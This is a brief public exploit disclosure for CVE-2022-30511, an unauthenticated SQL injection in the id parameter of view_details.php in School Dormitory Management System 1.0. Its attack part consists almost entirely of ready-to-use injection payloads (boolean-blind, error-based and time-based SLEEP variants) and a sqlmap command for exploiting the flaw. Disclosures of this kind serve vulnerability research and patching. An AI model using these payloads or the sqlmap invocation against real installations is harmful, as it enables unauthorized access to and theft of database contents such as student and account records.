# CVE-2022-30511
School Dormitory Management System 1.0 - Unauthenticated SQL Injection

#### Exploit Title: School Dormitory Management System 1.0 - Unauthenticated SQL Injection
#### Date: 2022-05-25
#### CVE: CVE-2022-30511
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15319/school-dormitory-management-system-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----

[#] Vulnerability Location:
	`$_GET['id']` in `/dms/admin/accounts/view_details.php:4`

>Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=accounts/view_details&id=2' AND 8853=8853 AND 'kujz'='kujz
>
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: page=accounts/view_details&id=2' AND (SELECT 8739 FROM(SELECT COUNT(*),CONCAT(0x716a6b6a71,(SELECT (ELT(8739=8739,1))),0x71766b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'fkLf'='fkLf
>
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=accounts/view_details&id=2' AND (SELECT 7339 FROM (SELECT(SLEEP(5)))Dkxx) AND 'UZCm'='UZCm

----

[#] Exploitation Using SQLMAP:
	`sqlmap -u "http://localhost/dms/admin/?page=accounts/view_details&id=2" --dbms=mysql`
